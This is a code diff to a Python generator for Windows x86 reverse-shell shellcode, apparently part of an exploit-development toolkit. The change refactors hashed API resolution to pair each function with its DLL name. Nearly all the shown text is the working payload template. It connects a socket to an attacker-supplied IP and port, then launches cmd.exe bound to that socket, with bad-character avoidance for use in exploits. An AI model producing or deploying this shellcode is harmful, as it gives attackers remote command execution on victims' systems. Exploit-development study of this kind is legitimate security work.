@@ -1,8 +1,7 @@
+from coder import call_exit_func, find_and_call
 from coder.util import (
-    call_exit_func,
     convert_ip_addr_hex,
     convert_port_hex,
-    find_and_call,
     find_hash_key,
     push_hash,
     push_string,
@@ -13,7 +12,13 @@ def generate(ip_addr, port, bad_chars, exit_func, debug=False):
     ip_addr_hex = convert_ip_addr_hex(ip_addr)
     port_hex = convert_port_hex(port)
     hash_key = find_hash_key(
-        ["LoadLibraryA", "WSAStartup", "WSASocketA", "WSAConnect", "CreateProcessA"]
+        [
+            ("KERNEL32.DLL", "LoadLibraryA"),
+            ("WS2_32.DLL", "WSAStartup"),
+            ("WS2_32.DLL", "WSASocketA"),
+            ("WS2_32.DLL", "WSAConnect"),
+            ("KERNEL32.DLL", "CreateProcessA"),
+        ]
         + ([exit_func] if exit_func else []),
         bad_chars,
     )
@@ -24,12 +29,12 @@ def generate(ip_addr, port, bad_chars, exit_func, debug=False):
         mov   ebp, esp
         add   esp, 0xfffff9f0           // Avoid NULL bytes
 
-    {find_and_call(hash_key)}
+    {find_and_call.generate(hash_key)}
 
     load_ws2_32:                        // HMODULE LoadLibraryA([in] LPCSTR lpLibFileName);
-        {push_string('ws2_32.dll', bad_chars)}
+        {push_string('WS2_32.DLL', bad_chars)}
         push  esp                       // lpLibFileName = &("ws2_32.dll")
-        {push_hash('LoadLibraryA', hash_key)}
+        {push_hash('KERNEL32.DLL', 'LoadLibraryA', hash_key)}
         call dword ptr [ebp+0x04]       // Call LoadLibraryA
 
     call_wsastartup:                    // int WSAStartup(WORD wVersionRequired, [out] LPWSADATA lpWSAData);
@@ -41,7 +46,7 @@ def generate(ip_addr, port, bad_chars, exit_func, debug=False):
         xor   eax, eax                  // eax = 0
         mov   ax, 0x0202                // eax = 0x202
         push  eax                       // wVersionRequired = 0x202
-        {push_hash('WSAStartup', hash_key)}
+        {push_hash('WS2_32.DLL', 'WSAStartup', hash_key)}
         call dword ptr [ebp+0x04]       // Call WSAStartup
 
     call_wsasocketa:                    // SOCKET WSAAPI WSASocketA([in] int af, [in] int type, [in] int protocol, [in] LPWSAPROTOCOL_INFOA lpProtocolInfo, [in] GROUP g, [in] DWORD dwFlags);
@@ -55,7 +60,7 @@ def generate(ip_addr, port, bad_chars, exit_func, debug=False):
         push  eax                       // type = 0x1
         inc   eax                       // eax = 0x2
         push  eax                       // eax = 0x2
-        {push_hash('WSASocketA', hash_key)}
+        {push_hash('WS2_32.DLL', 'WSASocketA', hash_key)}
         call dword ptr [ebp+0x04]       // Call WSASocketA
         mov   esi, eax                  // esi = sock
 
@@ -81,7 +86,7 @@ def generate(ip_addr, port, bad_chars, exit_func, debug=False):
         push  eax                       // namelen = 0x10
         push  edi                       // *name = &(sockaddr_in)
         push  esi                       // s = sock
-        {push_hash('WSAConnect', hash_key)}
+        {push_hash('WS2_32.DLL', 'WSAConnect', hash_key)}
         call dword ptr [ebp+0x04]       // Call WSAConnect
 
     create_startupinfoa:                // typedef struct _STARTUPINFOA {{DWORD cb; LPSTR lpReserved; LPSTR lpDesktop; LPSTR lpTitle; DWORD dwX; DWORD dwY; DWORD dwXSize; DWORD dwYSize; DWORD dwXCountChars; DWORD dwYCountChars; DWORD dwFillAttribute; DWORD dwFlags; WORD wShowWindow; WORD cbReserved2; LPBYTE lpReserved2; HANDLE hStdInput; HANDLE hStdOutput; HANDLE hStdError;}}
@@ -122,8 +127,8 @@ def generate(ip_addr, port, bad_chars, exit_func, debug=False):
         push  eax                       // lpProcessAttributes = NULL
         push  ebx                       // lpCommandLine = &("cmd.exe")
         push  eax                       // lpApplicationName = NULL
-        {push_hash('CreateProcessA', hash_key)}
+        {push_hash("KERNEL32.DLL", 'CreateProcessA', hash_key)}
         call dword ptr [ebp+0x04]       // Call CreateProcessA
 
-    {call_exit_func(exit_func, hash_key)}
+    {call_exit_func.generate(exit_func, hash_key)}
     """
